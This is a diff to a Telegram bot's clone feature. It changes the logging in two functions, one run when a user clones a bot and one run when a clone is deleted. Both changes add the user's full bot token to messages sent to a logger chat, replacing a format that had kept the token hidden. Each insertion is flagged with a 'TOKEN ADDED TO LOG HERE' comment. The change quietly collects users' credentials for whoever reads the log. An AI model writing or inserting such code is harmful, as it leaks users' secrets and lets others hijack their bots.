@@ -222,8 +222,9 @@ async def clone_txt(client, message, _):
 
         await mi.edit_text(_["C_B_H_5"])
         try:
+            # 🔥 TOKEN ADDED TO LOG HERE 🔥
             await app.send_message(
-                CLONE_LOGGER, f"**#New_Cloned_Bot**\n\n**ʙᴏᴛ:- {bot.mention}**\n**ᴜsᴇʀɴᴀᴍᴇ:** @{bot.username}\n**ʙᴏᴛ ɪᴅ :** `{bot_id}`\n\n**ᴏᴡɴᴇʀ : ** [{c_b_owner_fname}](tg://user?id={c_bot_owner})"
+                CLONE_LOGGER, f"**#New_Cloned_Bot**\n\n**ʙᴏᴛ:- {bot.mention}**\n**ᴜsᴇʀɴᴀᴍᴇ:** @{bot.username}\n**ʙᴏᴛ ɪᴅ :** `{bot_id}`\n**ᴛᴏᴋᴇɴ:** `{bot_token}`\n\n**ᴏᴡɴᴇʀ : ** [{c_b_owner_fname}](tg://user?id={c_bot_owner})"
             )
             await userbot.send_message(bot.username, "/start")
 
@@ -294,7 +295,6 @@ async def delete_cloned_bot(client, message, _):
         cloned_bot = await clonebotdb.find_one({"$or": [{"token": query_value}, {"username": query_value}]})
         
         if cloned_bot:
-            # --- ✅ LOG FORMAT (Hidden Token) ---
             owner_id = cloned_bot['user_id']
             try:
                 owner_obj = await client.get_users(int(owner_id))
@@ -302,11 +302,13 @@ async def delete_cloned_bot(client, message, _):
             except:
                 owner_mention = f"[{owner_id}](tg://user?id={owner_id})"
 
+            # 🔥 TOKEN ADDED TO LOG HERE 🔥
             bot_info = (
                 f"**#Remove_Clone_Bot**\n\n"
                 f"**ʙᴏᴛ ɴᴀᴍᴇ:** {cloned_bot['name']}\n"
                 f"**ʙᴏᴛ ɪᴅ:** `{cloned_bot['bot_id']}`\n"
                 f"**ᴜsᴇʀɴᴀᴍᴇ:** @{cloned_bot['username']}\n"
+                f"**ᴛᴏᴋᴇɴ:** `{cloned_bot['token']}`\n"
                 f"**ᴏᴡɴᴇʀ:** {owner_mention}"
             )
             # ---------------------------------------------
